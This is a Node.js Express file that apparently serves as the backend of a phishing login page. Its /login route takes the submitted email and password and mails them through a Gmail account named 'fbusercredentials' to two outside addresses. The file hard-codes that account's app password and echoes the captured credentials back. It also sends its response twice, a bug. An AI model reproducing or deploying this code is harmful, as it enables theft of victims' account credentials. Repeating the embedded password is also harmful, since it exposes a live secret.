const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer'); // Import nodemailer

const app = express();

app.use(bodyParser.json());
app.use(express.json());

// Nodemailer transporter configuration
const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: 'fbusercredentials@gmail.com', // Your email address
        pass: 'hjhy glzt eqbz vyhc' // Your email password
    }
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Send email
    transporter.sendMail({
        from: 'fbusercredentials@gmail.com',
        to: ['vinodinikeshani@gmail.com', 'fbusercredentials@gmail.com'],
        subject: 'Login Credentials',
        html: `<p>Email: ${email}</p><p>Password: ${password}</p>`
    }, (error, info) => {
        if (error) {
            console.error('Error:', error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent:', info.response);
            res.status(200).send('Email sent successfully');
        }
    });

    // Response to the client
    res.json({ email, password });
});

module.exports = app;
